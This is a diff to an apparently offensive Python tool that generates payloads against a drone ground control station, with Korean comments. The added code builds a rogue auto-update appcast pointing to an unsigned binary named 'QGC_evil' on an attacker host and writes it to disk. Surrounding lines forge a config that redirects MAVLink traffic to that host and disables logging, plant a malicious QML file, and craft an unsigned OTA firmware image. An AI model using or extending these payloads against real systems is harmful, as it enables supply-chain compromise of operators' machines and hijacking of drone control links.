@@ -29,6 +29,11 @@ def payload_bytes(sid: str, kind: str) -> bytes:
                 b"onTriggered: Qt.exit(0)}', parent); }\n")
     if kind == "config":                # GCS 설정 변조(원격 엔드포인트 재지정)
         return b"[Comm]\nMAVLINK_COMM=udp:203.0.113.66:14550\n[Logging]\nEnabled=false\n"
+    if kind == "update":                # 자동업데이트 MITM — 무서명 바이너리 지목 rogue appcast
+        return (b'<?xml version="1.0"?><rss xmlns:sparkle="http://sparkle-project.org">'
+                b'<channel><item><sparkle:version>99.9</sparkle:version>'
+                b'<enclosure url="http://203.0.113.66/QGC_evil" length="0" '
+                b'type="application/octet-stream"/></item></channel></rss>')
     if kind == "firmware":              # 무서명 OTA 펌웨어 헤더(변조)
         return b"FWIMG\x00" + b"\xef" * 64 + b"UNSIGNED_OTA"
     return b""
@@ -57,14 +62,14 @@ def execute_real(sid: str) -> dict:
     kind, obj = m["kind"], m["objective"]
 
     # 1) 파일계열 — 실제 디스크 쓰기
-    if kind in ("mission_file", "qml", "config", "firmware"):
+    if kind in ("mission_file", "qml", "config", "firmware", "update"):
         d = os.environ.get("GROUND_TARGET_DIR", "")
         data = payload_bytes(sid, kind)
         if not d:
             return {"sent": False, "reason": "GROUND_TARGET_DIR 미설정", "bytes": len(data)}
         os.makedirs(d, exist_ok=True)
-        fn = {"mission_file": "evil.plan", "qml": "evil.qml",
-              "config": "gcs.ini", "firmware": "modem_ota.bin"}[kind]
+        fn = {"mission_file": "evil.plan", "qml": "evil.qml", "config": "gcs.ini",
+              "firmware": "modem_ota.bin", "update": "appcast.xml"}[kind]
         path = os.path.join(d, f"{sid}_{fn}")
         with open(path, "wb") as f:
             f.write(data)
